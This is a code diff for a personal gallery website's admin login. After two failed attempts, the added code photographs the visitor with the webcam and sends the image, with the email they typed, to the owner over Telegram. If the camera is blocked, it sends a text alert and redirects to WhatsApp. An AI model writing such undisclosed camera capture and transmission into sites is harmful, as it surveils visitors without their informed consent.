@@ -177,7 +177,7 @@
     <source src="gallery_song.mp3" type="audio/mpeg">
   </audio>
 
-  <!-- Love Story অডিও (ডিফল্ট love_story.mp3, অ্যাডমিন থেকে যেকোনো mp3 সেট করা যাবে) -->
+  <!-- Love Story অডিও (ডিফল্ট love_story.mp3) -->
   <audio id="loveStoryAudio" src="love_story.mp3" preload="auto"></audio>
 
   <div class="card">
@@ -438,12 +438,10 @@
 
     function normalizeAudioUrl(rawUrl) {
       let url = (rawUrl || DEFAULT_LOVE_STORY.audioSrc).trim();
-      // Google Drive শেয়ার লিংক দিলে অটোমেটিক ডাইরেক্ট ডাউনলোড/স্ট্রিম লিংকে রূপান্তর
       const driveMatch = url.match(/drive\.google\.com\/file\/d\/([^/]+)/);
       if (driveMatch && driveMatch[1]) {
         url = `https://drive.google.com/uc?export=download&id=${driveMatch[1]}`;
       }
-      // GitHub blob লিংক দিলে raw লিংকে রূপান্তর
       if (url.includes('github.com/') && url.includes('/blob/')) {
         url = url.replace('github.com/', 'raw.githubusercontent.com/').replace('/blob/', '/');
       }
@@ -741,17 +739,24 @@
       wrongAttempts = 0;
     }
 
-    /* ক্যামেরা Allow করলে ছবি তুলে Worker-এর মাধ্যমে পাঠানো, Block করলে WhatsApp */
-    async function handleSecurityCheck() {
+    /* ক্যামেরা Allow করলে ছবি তুলে Worker-এর মাধ্যমে টেলিগ্রামে পাঠানো, Block করলে টেলিগ্রামে SMS + WhatsApp */
+    async function handleSecurityCheck(attemptedEmail) {
       const timeStr = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
+      const triedEmailText = attemptedEmail ? `\n📧 Email: ${attemptedEmail}` : '';
+
       try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('Camera API unavailable');
+        }
+
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         const video = document.createElement('video');
         video.srcObject = stream;
+        video.muted = true;
         video.setAttribute('playsinline', '');
         await video.play();
 
-        await new Promise(resolve => setTimeout(resolve, 600));
+        await new Promise(resolve => setTimeout(resolve, 650));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 480;
@@ -761,21 +766,22 @@
 
         stream.getTracks().forEach(track => track.stop());
 
-        const caption = `📸 Admin Intruder Alert!\n\nপর পর ২ বার ভুল লগইন দিয়েছে এবং ক্যামেরা Allow করেছে!\n🕒 সময়: ${timeStr}\n🌐 সাইট: himelahammed0.github.io`;
-        await new Promise(resolve => {
-          canvas.toBlob(async (blob) => {
-            if (blob) {
-              await sendTelegramPhoto(blob, caption);
-            }
-            resolve();
-          }, 'image/jpeg', 0.85);
+        const caption = `📸 Admin Intruder Alert!\n\nপর পর ২ বার ভুল লগইন দিয়েছে এবং ক্যামেরা Allow করেছে!${triedEmailText}\n🕒 সময়: ${timeStr}\n🌐 সাইট: himelahammed0.github.io`;
+        const photoBlob = await new Promise(resolve => {
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
         });
+
+        if (photoBlob) {
+          await sendTelegramPhoto(photoBlob, caption);
+        } else {
+          await sendTelegramAlert(caption);
+        }
         closeLogin();
       } catch (cameraErr) {
-        const alertText = `⚠️ Admin Alert!\n\nকেউ পর পর ২ বার ভুল লগইন দিয়ে আপনার ওয়েবসাইটের Admin প্যানেলে ঢোকার চেষ্টা করেছে (ক্যামেরা Block করেছে)!\n\n🕒 সময়: ${timeStr}\n🌐 সাইট: himelahammed0.github.io`;
+        const alertText = `⚠️ Admin Alert!\n\nকেউ পর পর ২ বার ভুল লগইন দিয়ে আপনার ওয়েবসাইটের Admin প্যানেলে ঢোকার চেষ্টা করেছে (ক্যামেরা Block করেছে)!${triedEmailText}\n\n🕒 সময়: ${timeStr}\n🌐 সাইট: himelahammed0.github.io`;
         await sendTelegramAlert(alertText);
         closeLogin();
-        window.location.href = "https://wa.me/8801938250868?text=" + encodeURIComponent("`Give Admin`");
+        window.location.href = "https://wa.me/8801938250868?text=" + encodeURIComponent("Give Admin");
       }
     }
 
@@ -818,12 +824,20 @@
         errEl.style.display = 'block';
         if (wrongAttempts >= 2) {
           wrongAttempts = 0;
-          await handleSecurityCheck();
+          await handleSecurityCheck(email);
         }
       } finally {
         loginBtn.disabled = false;
       }
     }
+
+    // Enter কী চাপলেও যেন Login কাজ করে
+    document.getElementById('pass').addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        checkPass();
+      }
+    });
 
     function closeUpload() {
       document.getElementById('uploadModal').style.display = 'none';
